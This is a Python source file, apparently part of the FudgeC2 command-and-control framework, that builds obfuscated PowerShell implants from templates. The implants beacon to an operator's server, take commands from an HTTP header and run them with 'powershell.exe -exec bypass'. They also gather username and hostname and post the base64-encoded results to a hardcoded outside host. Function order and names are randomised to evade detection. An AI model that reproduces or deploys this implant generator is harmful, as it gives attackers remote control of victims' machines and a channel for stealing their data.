import jinja2
import string
import random


class ImplantGenerator:
    # ImplantGenerator has a single public method (generate_implant_from_template)
    #   which is used to generate a new active implant in the event of a stager
    #   calling back. Configuration from the implant template is used to determine
    #   which functionality should be embedded within the active implant.

    JinjaRandomisedArgs = {"rnd_function": "aaaaaa",
                           "RemotePlayAudio": "RemotePlayAudio",
                           "sleep": "sleep"
                           }

    play_audio = '''
function {{ ron.RemotePlayAudio }} {
    $args[0]
}generate_implant_from_template
            '''
    fde_func_a = '''
function aaaaaa() {}
    '''
    fde_func_b = '''
function bbbbbb(){
    $hostN = hostname
    $final_str = $env:UserName+"::"+$hostN
    $Script:tr = $final_str
    write-output $Script:tr
}
    '''

    update_implant = '''
function JfaSlt ($a) {
    $b=($a -split "::")
    if ($b -Like " sys_info") {
        write-output "collecting sys_info"
        bbbbbb(0)
    } else {
        Write-Output $b
    }
}
        '''
    random_function = '''
function {{ ron.rnd_function }} () {}
        '''
    http_function = '''
function http-connection(){
    $Body =  @{username='me';moredata='qwerty'}
    $headers = @{}
    $headers.Add("X-Implant","{{ uii }}")
    try {
        $URL = "http://"+$sgep+":{{ http_port }}/index"
        $LoginResponse = Invoke-WebRequest $URL -Headers $headers -Body $Body -Method 'POST'
        $kni = $LoginResponse.Headers['X-Command']
    }
    catch {
        $kni = "=="
    }
    return $kni
    
}
    '''

    https_function = '''
function https-connection(){
    try {
        $URL = "https://"+$sgep+":8080/index"
        $kk = [System.Net.WebRequest]::Create($URL);
        $kk.Method = "POST"
        $kk.Headers.Add("X-Implant","420506")
        $kk.Timeout = 10000;
        $LoginResponse = $kk.GetResponse()
        $bb = $LoginResponse.Headers["X-Command"]
        $LoginResponse.dispose()
    }
    catch [system.exception] {
        $LoginResponse.dispose()
        $bb = "=="
    }
    return $bb
}
    '''

    implant_main = '''
start-sleep({{ initial_sleep }})
${{ ron.sleep }}={{ beacon }}
$sgep = "{{url}}"
while($true){
    start-sleep(${{ron.sleep}})
    try {
        {{ proto_core }}
    }
    catch {
        $_.Exception | format-list -Force
    }
    # Write-Output "$headers"
    if ( $headers -NotLike "=="){
        write-output "Non-sleep value"
        if ( $headers.Substring(0,2) -Like "::") {
            JfaSlt($headers)
        } else {
            $tr = powershell.exe -exec bypass -C "$headers"
        }
        # -- If command issued this is the pre-return processing.
        $atr = $tr-join "`n"
        $gtr="{{ uii }}::$atr"
        Write-Output $gtr
        $headers = @{}
        $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
        $headers.Add("X-Result",$b64tr)
        $LoginResponse = Invoke-WebRequest 'http://malware.moozle.wtf:5000/help' -Headers $headers -Body $Body -Method 'POST'
    }
}
    '''

    def _manage_implant_function_order(self, implant_info, function_list):
        # -- This is responsible for randomising the function order within the generated implant.
        if implant_info['obfuscation_level'] >= 1:
            print("Shuffling functions")
            random.shuffle(function_list)
        constructed_base_implant = ""
        for implant_function in function_list:
            constructed_base_implant = constructed_base_implant + implant_function
        constructed_base_implant = constructed_base_implant + self.implant_main
        return constructed_base_implant

    def _function_name_obfuscation(self, implant_info, function_names):
        print(implant_info['obfuscation_level'])
        if implant_info['obfuscation_level'] >= 2:
            for key in function_names.keys():
                letters = string.ascii_lowercase
                temp_string = ''.join(random.choice(letters) for i in range(8))
                if temp_string not in function_names.values():
                    function_names[key] = temp_string
        print(function_names)
        return function_names

    def __process_modules(self, id):
        # --  New in Dwarven Blacksmith
        # Add default functions to added to the implant which will be randomised.
        implant_functions = [self.play_audio,
                             self.random_function,
                             self.update_implant,
                             self.fde_func_a,
                             self.fde_func_b]
        # Checks which protocols should be embedded into the implant.
        print(id)
        if id['comms_http'] is not None:
            implant_functions.append(self.http_function)
        if id['comms_https'] is not None:
            implant_functions.append(self.https_function)
        # TODO: These protocols will be delivered in later iterations of FudgeC2
        # if id['comms_dns'] != None:
        #     implant_functions.append(self.https_function)
        # if id['comms_binary'] != None:
        #     implant_functions.append(self.https_function)

        constructed_implant = self._manage_implant_function_order(id, implant_functions)
        string = ""
        proto_count = 0
        proto_list = {'comms_http': 'http-connection',
                      'comms_https': 'https-connection',
                      'comms_dns': 'dns-connection'}

        for x in proto_list.keys():
            if id[x] is not 0:
                string = string + "    " + str(proto_count) + " { $headers = " + proto_list[x] + " }\n"
                proto_count += 1

        f_str = 'switch ( get-random('+str(proto_count)+') ){ \n'+string+'     }'
        return constructed_implant, f_str

    def generate_implant_from_template(self, implant_data):
        # --  New in Tauren Herbalist
        implant_template, protocol_switch = self.__process_modules(implant_data)

        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
        cc = jinja2.Template(implant_template)
        output_from_parsed_template = cc.render(
            initial_sleep=implant_data['initial_delay'],
            http=12345,
            url=implant_data['callback_url'],
            http_port=implant_data['comms_http'],
            https_port=implant_data['comms_https'],
            dns_port=implant_data['comms_dns'],
            uii=implant_data['unique_implant_id'],
            ron=implant_function_names,
            beacon=implant_data['beacon'],
            proto_core=protocol_switch
        )
        return output_from_parsed_template


blah = '''
render_implant (Public)
 - Takes the generated implant info (Gneretaed implants (by UIK)
 
process_modules 
 - this controls which protocols and additional modules are used by the implant.
 - Generated the main function multi proto selection

'''
